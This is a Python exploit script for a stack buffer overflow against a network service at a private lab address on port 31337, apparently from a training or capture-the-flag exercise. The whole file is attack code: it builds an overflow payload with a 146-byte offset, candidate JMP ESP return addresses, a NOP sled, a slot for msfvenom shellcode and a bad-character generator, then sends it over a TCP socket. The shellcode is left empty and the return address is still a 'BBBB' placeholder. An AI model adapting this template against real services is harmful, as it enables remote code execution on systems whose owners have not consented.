import socket
import struct

def main():

  # Basic information
  ip = '192.168.1.249'
  port = 31337
  offset = 146 
  total_length = 1000
  nop_sled_length = 16

  # We have the memory addresses of JMP ESP, but need to convert to something the program will understand
  new_eips = [0x080414c3, 0x080416bf]
  packed_bytes = [ struct.pack("<I", item) for item in new_eips ]

  # Build a nop sled
  nop_sled = b"\x90"

  # MSFVenom Payload
  buf = b""

  # The shellcode to execute
  shellcode = buf

  for eip_in_bytes in packed_bytes:
    # Calculate the various pieces needed
    esp_length = total_length - offset - len(eip_in_bytes) - nop_sled_length - len(shellcode)

    # Get all bytes to check for bad chars
    bad_chars = get_all_bytes()

    # Build the payload
    payload = [
      b"A" * offset, # The overflow
      b"BBBB",#new_eip[0], # The new EIP
      # bad_chars, # If checking this, make the stack length be esp_length - len(bad_chars)
      nop_sled * nop_sled_length,
      shellcode, # Shellcode generated by msfvenom
      b"C" * esp_length, # The Stack 
      b"\r\n", # Send to program
    ]
    payload = b"".join(payload)

    send_payload(ip, port, payload)

def send_payload(ip, port, payload):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((ip, port))
  sock.send(payload)
  sock.close()

def get_all_bytes():
  # Return all bytes, but not the 0x00 (null byte)
  return b"".join([ struct.pack('<B', x) for x in range(1, 256) ])

if __name__ == "__main__":
  main()
